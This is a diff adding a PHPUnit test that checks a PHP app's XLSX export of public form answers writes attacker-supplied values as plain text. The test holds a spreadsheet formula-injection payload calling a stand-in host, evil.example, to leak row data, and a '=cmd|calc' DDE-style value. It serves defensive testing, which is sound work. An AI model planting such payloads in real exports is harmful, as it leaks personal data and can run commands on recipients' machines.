@@ -544,6 +544,42 @@ class NewsIntegrationTest extends TestCase
         $this->assertStringStartsWith('PK', $response->getBody());
     }
 
+    /**
+     * POST /news/{id}/form/submit is public, so a form answer is
+     * attacker-controlled. It must never become a live formula in the
+     * XLSX a chief opens — the CSV/spreadsheet formula-injection class,
+     * where =HYPERLINK(...) would exfiltrate the other rows' PII on open.
+     */
+    public function testExportedAnswersAreWrittenAsTextNotFormulas(): void
+    {
+        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
+        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
+
+        $payload = '=HYPERLINK("https://evil.example/?d="&A2,"Cliquez")';
+        $this->responseRepository->create($formId, null, null, '=cmd|calc', [$fieldId => $payload], null, null);
+
+        $response = $this->formController->exportResponses(
+            new Request('GET', '/news/' . $articleId . '/form/responses/export', [], [], [], []),
+            ['id' => (string) $articleId]
+        );
+
+        $tmp = tempnam(sys_get_temp_dir(), 'news_export_') . '.xlsx';
+        file_put_contents($tmp, $response->getBody());
+        $sheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($tmp)->getActiveSheet();
+        @unlink($tmp);
+
+        // Column 1 = contact, column 2 = the answer. Both are attacker text.
+        $contactCell = $sheet->getCell([1, 2]);
+        $answerCell = $sheet->getCell([2, 2]);
+
+        $this->assertSame(\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_STRING, $answerCell->getDataType());
+        $this->assertSame($payload, $answerCell->getValue(), 'stored verbatim as text, not evaluated');
+        $this->assertSame(\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_STRING, $contactCell->getDataType());
+        $this->assertSame('=cmd|calc', $contactCell->getValue());
+    }
+
     public function testEditResponsePageRendersForOwnerWhileOpen(): void
     {
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
